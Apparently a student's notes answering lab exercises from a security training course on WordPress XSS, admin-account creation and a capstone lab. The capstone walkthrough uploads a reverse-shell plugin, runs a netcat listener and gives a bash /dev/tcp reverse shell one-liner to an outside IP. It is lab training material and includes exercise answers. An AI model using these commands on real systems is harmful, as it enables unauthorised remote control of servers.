
1. Start Walkthrough VM 1 and replicate the steps learned in this Learning Unit to identify the basic XSS vulnerability present in the Visitors plugin. Based on the source code portion we have explored, which other HTTP header might be vulnerable to a similar XSS flaw?

X-Forwarded-For



2. Start Walkthrough VM 2 and replicate the privilege escalation steps we explored in this Learning Unit to create a secondary administrator account. What is the JavaScript method responsible for interpreting a string as code and executing it?

eval



3. **Capstone Lab**: Start Module Exercise VM 1 and add a new administrative account like we did in this Learning Unit. Next, craft a WordPress plugin that embeds a web shell and exploit it to enumerate the target system. Upgrade the web shell to a full reverse shell and obtain the flag located in **/tmp/**. Note: The WordPress instance might show slow responsiveness due to lack of internet connectivity, which is expected.

Since we have the WordPress admin account credentials, we can connect to **http://offsecwp/wp-login.php**.

Next goal is to upload a plugin that offers a reverse shell.
Trying https://github.com/4m3rr0r/Reverse-Shell-WordPress-Plugin

Finding my IP:
```bash
ifconfig
# Take the tun0 interface
```

![[Pasted image 20250311000355.png]]

Running the reverse shell:
```bash
nc -lnvp 4444
```

That worked!
![[Pasted image 20250311000314.png]]


```
cat /tmp/flag
```


Tips to improve the shell:
Since we have a pretty bad shell, simply run

```bash

# In a first terminal
nc -lvnp 4445

# In the poor terminal
/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.238/4445 0>&1'
```
This will fix the terminal :)
